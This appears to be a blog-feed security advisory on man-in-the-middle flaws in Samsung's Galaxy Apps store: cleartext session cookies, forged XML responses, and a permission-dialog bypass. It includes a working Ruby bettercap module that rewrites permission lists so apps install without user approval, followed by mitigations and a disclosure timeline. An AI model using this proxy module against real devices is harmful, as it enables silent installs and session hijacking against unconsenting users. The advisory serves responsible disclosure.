<h4 id="Affected-Products"><a href="#Affected-Products" class="headerlink" title="Affected Products"></a>Affected Products</h4><p>Samsung Galaxy Apps &lt;= 4.1.01-14</p>
<center><br><img src="/images/2016/08/galaxyapps.png" alt="galaxy apps"><br></center>

<a id="more"></a>
<h2 id="MITM-Information-Leaks-and-Session-Hijacking"><a href="#MITM-Information-Leaks-and-Session-Hijacking" class="headerlink" title="MITM, Information Leaks and Session Hijacking"></a>MITM, Information Leaks and Session Hijacking</h2><h4 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h4><p>Most of the application API requests are made through a unsafe HTTP connection which would allow a malicious third party to perform a network MITM attack and eventually exfiltrate user sensitive data such as his session identifier and subsequently use this data to impersonate the user session.</p>
<h4 id="Details"><a href="#Details" class="headerlink" title="Details"></a>Details</h4><p>The application relies on a XML based API used through HTTP, as soon as the user will open the app and start browsing a network attacker will be able to see requests sent to the API server and the user session data, for instance the first request being executed when the user clicks on an application detail page, identified by the name <strong>productDetailOverview</strong> is composed as shown in the following picture.</p>
<center><br><img src="/images/2016/08/productDetailOverview.png" alt="galaxy apps"><br></center>

<p>The XML response will contain application data such as the creation date, last update date, product name and description, etc.</p>
<p>It is possible to see that the user session cookies ( <strong>UUID</strong> and <strong>JSESSIONID</strong> ) are sent in cleartext, therefore they can be used by an attacker to impersonate the user and perform API requests on his behalf.</p>
<p>Other XML request names sent during application browsing and installation are:</p>
<ul>
<li><strong>bigBannerList</strong>, used to obtain application preview images.</li>
<li><strong>expertCommentList</strong> and commentList, these fetch comments for an app.</li>
<li><strong>productDetailRelated</strong>, fetches related applications list.</li>
<li><strong>categoryProductList2Notc</strong>, fetches products in the same category.</li>
<li><strong>sellerProductList2Notc</strong>, fetches other products of the same vendor.</li>
<li><strong>androidManifestList</strong>, fetches the list of permissions required by the application before installing it ( more on this later ).</li>
</ul>
<h4 id="Impact"><a href="#Impact" class="headerlink" title="Impact"></a>Impact</h4><ul>
<li>User Impersonation - An attacker could use the exfiltrated session data to authenticate against the API server on the user’s behalf.</li>
<li>Contents Manipulation - With a transparent proxy and proper redirection rules, an attacker could intercept and modify the XML responses before they’re received by the application, this would allow him to replace product images, names and descriptions with fake ones.</li>
</ul>
<h2 id="Permissions-Dialog-Bypass"><a href="#Permissions-Dialog-Bypass" class="headerlink" title="Permissions Dialog Bypass"></a>Permissions Dialog Bypass</h2><h4 id="Summary-1"><a href="#Summary-1" class="headerlink" title="Summary"></a>Summary</h4><p>It is possible for an attacker performing a MITM network attack to intercept and modify the XML response of the <strong>androidManifestList</strong> request and force the product to install an application without showing to the user the permission list dialog which would require his approval.</p>
<h4 id="Details-1"><a href="#Details-1" class="headerlink" title="Details"></a>Details</h4><p>Once the user clicks on the “Install” button, an <strong>androidManifestList</strong> request is sent to the API endpoint in order to fetch the list of permissions that the application requires:</p>
<center><br><img src="/images/2016/08/androidManifestList.png" alt="galaxy apps"><br></center>

<p>As shown in this picture, the response will contain the list of permissions separated by a double pipe ( “||” ) token.</p>
<p>This list is then splitted by the application and the user is prompted with a dialog which shows him the required permissions, the installation process requires the user to accept all of them in order to successfully continue.</p>
<center><br><img src="/images/2016/08/mail.png" alt="galaxy apps"><br></center>

<p>An attacker performing a MITM network attack can intercept and modify the XML response for this API before it’s sent to the device and replace the permissions list with a single <strong>INTERNET</strong> permission entry, in this case the Samsung Galaxy Apps store will directly install the application without showing the user any dialog at all.</p>
<p>The following is a POC bettercap proxy module.</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">=begin</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">BETTERCAP</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Author : Simone 'evilsocket' Margaritelli</span></span><br><span class="line"><span class="comment">Email  : evilsocket<span class="doctag">@gmail</span>.com</span></span><br><span class="line"><span class="comment">Blog   : http://www.evilsocket.net/</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">This project is released under the GPL 3 license.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">=end</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GalaxyApps</span> &lt; BetterCap::Proxy::<span class="title">HTTP::Module</span></span></span><br><span class="line">  meta(</span><br><span class="line">    <span class="string">'Name'</span>        =&gt; <span class="string">'GalaxyApps'</span>,</span><br><span class="line">    <span class="string">'Description'</span> =&gt; <span class="string">'Bypass permission dialog for "Galaxy Apps" application on every Samsung device.'</span>,</span><br><span class="line">    <span class="string">'Version'</span>     =&gt; <span class="string">'1.0.0'</span>,</span><br><span class="line">    <span class="string">'Author'</span>      =&gt; <span class="string">"Simone 'evilsocket' Margaritelli"</span>,</span><br><span class="line">    <span class="string">'License'</span>     =&gt; <span class="string">'GPL3'</span></span><br><span class="line">  )</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">on_request</span><span class="params">( request, response )</span></span></span><br><span class="line">    <span class="keyword">if</span> !request.body.<span class="literal">nil</span>? <span class="keyword">and</span> request.body.<span class="keyword">include</span>?(<span class="string">'&lt;SamsungProtocol'</span>)</span><br><span class="line">      req_name = <span class="string">'???'</span></span><br><span class="line">      <span class="keyword">if</span> request.body =~ <span class="regexp">/.+&lt;request\s+name="([^"]+)"/i</span></span><br><span class="line">        req_name = $1</span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">      BetterCap::Logger.info <span class="string">"[<span class="subst">#&#123;<span class="string">'GALAXY APPS'</span>.green&#125;</span>] Detected Galaxy Apps traffic: <span class="subst">#&#123;<span class="string">'request'</span>.blue&#125;</span>='<span class="subst">#&#123;req_name.yellow&#125;</span>'"</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> req_name == <span class="string">'androidManifestList'</span></span><br><span class="line">        response.body.gsub!( <span class="regexp">/permission"&gt;[^&lt;]+&lt;/i</span>, <span class="string">'permission"&gt;INTERNET&lt;'</span> )</span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
<h4 id="Impact-1"><a href="#Impact-1" class="headerlink" title="Impact"></a>Impact</h4><p>An attacker could trick the user to think that an application which requires sensitive permissions does not require any at all, thus forcing the store to install it without any kind of user manual approval.</p>
<h4 id="Mitigations-amp-Recommendations"><a href="#Mitigations-amp-Recommendations" class="headerlink" title="Mitigations &amp; Recommendations"></a>Mitigations &amp; Recommendations</h4><ul>
<li>Use HTTPS connections for every API request.</li>
<li>Implement SSL key pinning to avoid SSL MITM attacks.</li>
<li>Double check the list of permissions after the application is downloaded reading them directly from its AndroidManifest.xml file.</li>
</ul>
<h4 id="Disclosure-Timeline"><a href="#Disclosure-Timeline" class="headerlink" title="Disclosure Timeline"></a>Disclosure Timeline</h4><ul>
<li>May 2 2016 : Initial disclosure.</li>
<li>June 7 2016 : Follow up.</li>
<li>June 8 2016 : Email from vendor working on fixes.</li>
<li>June 9 2016 : Confirmation that fixes were going to be pushed in next release</li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;The Samsung “Galaxy Apps” application installed on every recent Samsung device, a parallel store application with both apps for Samsung smartphones and smart watches, is vulnerable to MITM attacks which could cause user information leaks, permissions dialog bypass and session hijacking.&lt;/p&gt;
&lt;h4 id=&quot;Affected-Products&quot;&gt;&lt;a href=&quot;#Affected-Products&quot; class=&quot;headerlink&quot; title=&quot;Affected Products&quot;&gt;&lt;/a&gt;Affected Products&lt;/h4&gt;&lt;p&gt;Samsung Galaxy Apps &amp;lt;= 4.1.01-14&lt;/p&gt;
&lt;center&gt;&lt;br&gt;&lt;img src=&quot;/images/2016/08/galaxyapps.png&quot; alt=&quot;galaxy apps&quot;&gt;&lt;br&gt;&lt;/center&gt;
    
    </summary>
    
    
      <category term="mitm" scheme="https://www.evilsocket.net/tags/mitm/"/>
    
      <category term="man in the middle" scheme="https://www.evilsocket.net/tags/man-in-the-middle/"/>
    
      <category term="session hijacking" scheme="https://www.evilsocket.net/tags/session-hijacking/"/>
    
      <category term="permission bypass" scheme="https://www.evilsocket.net/tags/permission-bypass/"/>
    
      <category term="samsung" scheme="https://www.evilsocket.net/tags/samsung/"/>
    
      <category term="samsung galaxy apps" scheme="https://www.evilsocket.net/tags/samsung-galaxy-apps/"/>
    
      <category term="galaxy" scheme="https://www.evilsocket.net/tags/galaxy/"/>
    
  </entry>
  
</feed>
